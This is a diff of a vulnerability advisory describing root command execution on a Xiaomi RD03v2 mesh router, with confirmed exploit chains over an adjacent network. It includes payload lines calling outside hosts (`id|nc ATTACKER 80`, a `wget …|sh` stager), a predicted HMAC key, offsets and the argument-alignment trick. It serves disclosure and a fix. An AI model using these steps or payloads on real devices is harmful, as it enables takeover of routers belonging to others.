@@ -1,13 +1,18 @@
-# V2 — root command execution in a gate-open state (RCE)
+# V2 — root command execution (RCE)
 
-**CVSS 8.8 (High) for the demonstrated gate-open state.** After the same forged,
+**CVSS 8.8 (High), `AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`, for both
+hardware-confirmed adjacent paths.** The CAP chain requires the demonstrated
+gate-open state; the RE/WAN chain instead requires a factory-reset router and
+WAN-side L2 position. After the same forged,
 credential-free handshake as V1, an adjacent peer can reach a shell `eval` that
 runs as **root** when `NETMODE` leaves the CAP sink open. **Confirmed end-to-end on
 physical hardware after minimal initialization** via the OTA combined chain (V1 admin
 takeover → encryption-field injection → V2 trigger → interactive root shell over
-Wi-Fi). The direct injection variants (CAP/LAN ~4-char, RE/WAN ~36-byte
-ungated) are confirmed in emulation. Three paths to the same sink, with different
-payload budgets — see *Scope & severity*. Normal Xiaomi web setup can set
+Wi-Fi). The direct injection variants (CAP/LAN ~4-char, RE/WAN 32/64 reliable
+bytes) have different validation levels: CAP/LAN is confirmed in emulation,
+while RE/WAN is confirmed end-to-end on factory-reset hardware without V1 or an
+admin session. Three paths reach the same sink with different payload budgets —
+see *Scope & severity*. Normal Xiaomi web setup can set
 `NETMODE=whc_cap`, which skips the demonstrated CAP sink; see
 [`CORRECTIONS.md`](CORRECTIONS.md).
 
@@ -120,7 +125,7 @@ are on the `hackCheck` blacklist even for non-exempt parameters.
 ### Payload budget
 
 **Unlimited.** The `encryption` UCI value has no meaningful length cap, unlike the
-CAP plant (~4 chars) or RE `bh_ssid` (~36 bytes). This makes the OTA chain the
+CAP plant (~4 chars) or RE fields (32/64 reliable bytes; 36/66 encoder caps). This makes the OTA chain the
 practical exploitation path: it can deliver a full `wget|sh` stager, a reverse shell,
 or any arbitrary script.
 
@@ -154,6 +159,57 @@ RD03v2
 
 Full evidence in `evidence/hardware-validation.md`. PoC: `poc/ota_rce.py`.
 
+## Direct RE/WAN chain — confirmed on factory-reset hardware
+
+The RE path was reproduced end-to-end on the same physical RD03v2 running stock
+2.0.28. The final run began at factory defaults (`init_info.inited=0`) and used no
+web session, V1 leak, admin API, or `init_router.py`:
+
+1. Stock runtime port assignment populated `network.wan.ifname=eth1.4` before
+   `START=99`; `cab_meshd -C -i eth1.4` obtained DHCP address `192.168.77.142`.
+2. The RE broadcast `MIROUTE_RE_DDv1.0` on UDP/19553. The rogue CAP replied with
+   `MIROUTE_CAP_DDv1.0` plus its IP and accepted the RE's outbound TLS connection.
+3. The RE sent type-4 authentication with the `q38d…` role key. The rogue CAP sent
+   its type-4 authentication with the statically predicted `x38d…` key; the RE
+   accepted it and replied type-5 success.
+4. The rogue CAP sent a 1,764-byte type-6 body shaped like the stock CAP builder's
+   output, with a command expression in `bh_pswd`.
+5. Stock `cab_meshd` base64-encoded that field, invoked `mesh_connect.sh re_init`,
+   and `mimesh_init.sh` executed it as root. The proof payload was
+   `` `id|nc 192.168.77.1 80` `` (23 bytes).
+
+Observed callback:
+
+```
+uid=0(root) gid=0(root)
+```
+
+### Wire-layout correction required for exploitation
+
+The static offset mapping was correct but incomplete. A factory CAP sync body has
+empty front-haul password and management fields. `run_with_lock` invokes unquoted
+`$@`, so ash drops those empty words and shifts the later arguments: an otherwise
+authentic type-6 body does **not** land `body+0xe6`/`body+0x107` in
+`do_re_init` `$7`/`$8`. The working message fills the four preceding fields with
+ordinary nonempty password and management values for both bands, preserving
+all nine string positions. The daemon's C blacklist still sees only base64.
+
+The encoder limits remain 36 bytes (`bh_ssid`) and 66 bytes (`bh_pswd`). Their
+adjacent NUL-terminated wire slots provide reliable non-overlapping capacities of
+32 and 64 bytes; carefully arranged overlap can use additional encoder headroom.
+The 23-byte root proof fits without overlap.
+
+### State transition
+
+The RE shell entry has no `NETMODE` guard and `check_re_initted` remains dead code,
+but a successful `re_init` continues through `mimesh_init`, sets `INITTED=YES`, changes
+the wired client from the WAN MAC to the LAN MAC, and stops `cab_meshd`. The live
+path is therefore effectively **one-shot per factory reset**, despite the absence
+of the earlier guard. Failed or interrupted sync attempts may reconnect while the
+router remains uninitialized.
+
+PoC: `poc/re_wan_rce.py`.
+
 ## Scope & severity — three variants
 
 **OTA combined chain** (V1 → admin API → V2 trigger, over Wi-Fi):
@@ -176,44 +232,32 @@ initialized router with a gate-open mode; the same listener V1 uses):
   This is a tightly-budgeted root primitive in the gate-open state.
 
 **RE / WAN path** (`cab_meshd -C -i <wan>`, conditional on `INITTED!=YES`,
-`proto=dhcp`, and a nonempty WAN interface name): an **ungated, repeatable,
-~36-byte candidate root path in emulation**. The shipped WAN interface name is
-empty; whether boot-time port assignment starts the RE client on a fresh unit
-has not been measured on hardware.
-- **Ungated & repeatable.** `do_re_init` (`mesh_connect.sh:203-261`) has **no
-  `NETMODE` guard** and calls `mimesh_init` unconditionally (`:257`); the `INITTED`
-  gate `check_re_initted` (`:11`) is **dead code — never called**. Unlike the CAP
-  path it does **not** self-gate, so it is **repeatable**, not one-shot.
-- **Sink proven live (root):** running the stock `mesh_connect.sh re_init … <base64
-  payload> …` in a `rootfs28` chroot created a **root-owned** file. (`json_get_value`
-  → `/usr/sbin/parse_json`, a real ELF on `PATH`; the `eval` fires.)
-- **Delivery & budget.** The daemon RE builder (`0xa950`, called from the **type-6**
-  handler at `0x6a30`) reads the **raw wire body** and base64-encodes `conn+0xe6` →
-  `re_init %s7` = `do_re_init $7` = `bh_ssid` (the eval sink), and `conn+0x107` →
-  `%s8` = `bh_pswd`. The base64 encoder (`0x2bf8`) rejects input that would overflow
-  the destination, capping **`bh_ssid ≤ 36 bytes`** and **`bh_pswd ≤ 66 bytes`** —
-  not unlimited, but far larger than the CAP path's ~4 bytes and **enough for a
-  fetch-and-exec stager** (e.g. `` `wget http://a/x|sh` ``, 18 B). The base64
-  laundering means these carry arbitrary bytes past `check_injection`.
-- **Discovery proven live.** The RE broadcasts `MIROUTE_RE_DDv1.0` (18 B) to
-  `255.255.255.255:19553` and accepts a response of `MIROUTE_CAP_DDv1.0` (18 B)
-  **followed by the CAP's IP string at offset `0x12`** (≥16 B), delivered as a
-  genuine UDP datagram inbound on its WAN. With that, the live daemon logs *"Found
-  CAP in L2-net"*. TLS is no barrier — the RE client sets `SSL_VERIFY_NONE` (`0x338c`)
-  and presents no client certificate, so a self-signed rogue CAP completes the
-  handshake.
-- **Outstanding.** The full one-run chain (rogue CAP → TLS → type-6 → root file) was
-  not stitched under emulation: after *"Found CAP"* the RE gates its outbound TCP
-  connect on a **WAN-gateway environment check** (`/tmp/cab_meshd_gw_ip`, WAN link)
-  that a bare veth netns cannot satisfy. This could be an emulation limitation,
-  but the shipped WAN interface name is also empty. Fresh-device startup, the
-  single-run stitch, and the RE-side auth key for the reversed handshake remain
-  unverified.
+`proto=dhcp`, and a nonempty WAN interface name): **confirmed end-to-end on
+factory-reset physical hardware**.
+- **No V1 or initialization step.** The target initiated discovery and TLS from
+  its WAN lease while `INITTED=0`; no web login or admin API call was used.
+- **Runtime startup confirmed.** Although the shipped static WAN name is empty,
+  `port_service` assigned `eth1.4` during boot before `cab_meshd` started. The
+  gateway check passed with an ordinary DHCP lease and `/tmp/cab_meshd_gw_ip`.
+- **Reversed authentication confirmed.** The RE accepted the rogue CAP's
+  `x38d364d8ed3bd085e150211ea6b3715` HMAC and entered `ST_RUNNING` over TLS 1.2
+  without client certificates.
+- **Delivery confirmed.** A correctly shaped type-6 body placed base64-laundered
+  data from `body+0xe6`/`body+0x107` into `do_re_init` `$7`/`$8`; a 23-byte
+  `` `id|nc ATTACKER 80` `` payload returned `uid=0(root) gid=0(root)`.
+- **Argument alignment matters.** The four earlier password/management fields must
+  be nonempty or unquoted `$@` drops them and moves the controlled fields away from
+  the sink.
+- **Budget.** The encoder caps remain 36/66 bytes. Reliable non-overlapping fields
+  hold 32/64 bytes; overlap layouts can recover some of the remaining headroom.
+- **One-shot after success.** `do_re_init` is not guarded, but successful mesh
+  initialization sets `INITTED=YES` and stops `cab_meshd`, closing the factory RE
+  path until another reset.
 
 ## Honest status
 
-**The OTA combined chain (V1 → V2) is confirmed end-to-end on physical hardware
-in the minimally initialized, gate-open state.**
+**Both the OTA combined chain and the direct factory RE/WAN chain are confirmed
+end-to-end on physical hardware.**
 The full sequence — pre-auth admin takeover, encryption-field injection,
 `cap_init` trigger, root callback (`uid=0`), interactive root shell — was reproduced
 multiple times on a physical RD03v2 running `romversion 2.0.28`. The device stayed
@@ -221,12 +265,12 @@ online throughout (self-repairing payload). This is the definitive proof that V2
 a real root RCE on stock hardware in that state. It does not establish the same
 reachability after normal web setup sets `NETMODE=whc_cap`.
 
-The direct injection variants remain at their prior evidence levels: the **CAP/LAN
-path** is confirmed in emulation (daemon-driven root-owned file); the **RE/WAN path**
-has each link independently confirmed in emulation but the full single-run chain was
-not stitched (the WAN-gateway check and fresh-device startup need live validation).
-Both were independently re-verified by a separate reviewer, which also corrected the
-earlier "uncapped" wording to the measured ~36/~66-byte budget.
+The direct **CAP/LAN path** remains confirmed in emulation. The direct **RE/WAN
+path** was run from `INITTED=0` through WAN DHCP, discovery, reversed HMAC/TLS,
+type-6 delivery, and a root identity callback on the physical device. This result
+also corrects two earlier statements: successful `re_init` makes the exposure
+one-shot by setting `INITTED=YES`, and empty preceding fields must be populated to
+keep the vulnerable arguments in `$7/$8`.
 
 ## Fix
 Quote `$@` in `run_with_lock`; never `base64 -d`→`eval` peer data; don't rely on the
